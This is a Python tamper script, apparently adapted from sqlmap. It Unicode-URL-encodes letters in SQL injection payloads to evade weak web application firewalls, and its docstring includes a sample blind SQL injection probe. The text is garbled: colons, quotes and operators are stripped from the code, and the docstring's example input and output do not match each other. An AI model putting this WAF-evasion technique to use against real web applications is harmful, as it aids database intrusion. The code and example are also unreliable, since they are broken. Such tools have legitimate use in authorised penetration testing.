#!usrbinenv python


Copyright (c) 2013-2015 xiaol developers (httpxlixli.net)


import os
import string

from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage

__priority__ = PRIORITY.LOWEST

def dependencies()
    singleTimeWarnMessage(tamper script '%s' is only meant to be run against ASP or ASP.NET web applications % os.path.basename(__file__).split(.)[0])

def tamper(payload, kwargs)
    
    Unicode-url-encodes non-encoded characters in a given payload
    (initial)

    Requirement
         ASP
         ASP.NET

    Tested against
         Microsoft SQL Server 2000
         Microsoft SQL Server 2005
         MySQL 5.1.56
         PostgreSQL 9.0.3

    Notes
         Useful to bypass weak web application firewalls that do not
          unicode url-decode the request before processing it through their
          ruleset

     tamper('ELECT CONCAT(0x4c584a424c,(SELECT (CASE WHEN (2812=2812) THEN 1 ELSE 0 END)),0x4c5856504c)')
    '%u0053ELECT %u0043ONCAT(0x4c584a424c,(%u0053ELECT (%u0043ASE %u0057HEN (1068=1068) %u0054HEN 1 %u0045LSE 0 %u0045ND)),0x4c5856504c)'
    

    retVal = payload

    if payload
        retVal = 
        i = 0
        first = True
        char = True
        while i  len(payload)
            if first and payload[i] in string.letters and char
                first = False
                retVal += '%%u%.4X' % ord(payload[i])
                char = False
            elif payload[i] in string.letters and char and payload[i-1] not in string.digits
                char = False
                retVal += '%%u%.4X' % ord(payload[i])
            else
                retVal += payload[i]
            if payload[i] not in string.letters
                char = True
            i += 1

    return retVal
